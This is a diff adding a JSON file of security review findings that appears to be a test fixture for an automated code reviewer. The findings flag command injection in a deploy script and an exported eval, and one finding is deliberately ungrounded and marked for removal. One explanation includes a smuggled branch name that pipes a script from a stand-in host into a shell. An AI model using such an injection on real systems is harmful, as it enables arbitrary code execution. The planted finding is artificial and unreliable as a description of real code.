@@ -1,0 +1,37 @@
+{
+  "findings": [
+    {
+      "title": "Branch name passed to a shell command without validation",
+      "severity": "high",
+      "category": "security",
+      "confidence": 0.8,
+      "filePath": "src/deploy.ts",
+      "startLine": 4,
+      "endLine": 4,
+      "explanation": "deploy() interpolates its branch argument into a shell command. A branch name such as `main; curl evil.sh | sh` would run arbitrary commands on the deploy host.",
+      "evidence": "execSync(`git push origin ${branch}`);",
+      "suggestedFix": "Use execFileSync('git', ['push', 'origin', branch]) so no shell is involved."
+    },
+    {
+      "title": "Exported function evaluates arbitrary strings",
+      "severity": "high",
+      "category": "security",
+      "confidence": 0.75,
+      "filePath": "src/config.ts",
+      "startLine": 12,
+      "explanation": "evaluate() is exported and passes its argument straight to eval, so any caller that forwards user input enables code execution.",
+      "evidence": "return eval(expression);",
+      "suggestedFix": "Remove evaluate() or replace it with a parser for the specific expressions you need."
+    },
+    {
+      "title": "Missing authorization check",
+      "severity": "critical",
+      "category": "security",
+      "confidence": 0.9,
+      "filePath": "src/deploy.ts",
+      "startLine": 3,
+      "explanation": "This finding quotes code that does not exist in the diff and must be dropped by evidence grounding.",
+      "evidence": "if (!user.isAdmin) return;"
+    }
+  ]
+}
